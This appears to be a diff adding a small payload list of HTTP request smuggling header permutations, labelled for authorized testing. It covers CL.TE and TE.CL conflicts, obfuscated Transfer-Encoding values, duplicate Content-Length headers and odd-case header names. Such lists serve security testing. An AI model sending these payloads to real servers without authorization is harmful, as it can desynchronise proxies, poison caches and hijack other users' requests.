@@ -1,0 +1,15 @@
+# Request smuggling header permutations (for authorized testing only)
+# TE.CL vs CL.TE and obfuscations
+Content-Length: 6\nTransfer-Encoding: chunked\n\n0\n\n
+Transfer-Encoding: chunked\nContent-Length: 4\n\n5\nABCDE\n0\n\n
+# Obfuscated TE variants
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked, x
+Transfer-Encoding: chunked\nX: x\n\n0\n\n
+# Duplicate headers variants
+Content-Length: 4\nContent-Length: 6\n\n
+# TE with case/mid-space
+tRansfer-ENcoding: chunked
+Transfer-Encoding: chunked\n\n5\nABCDE\n0\n\n
+
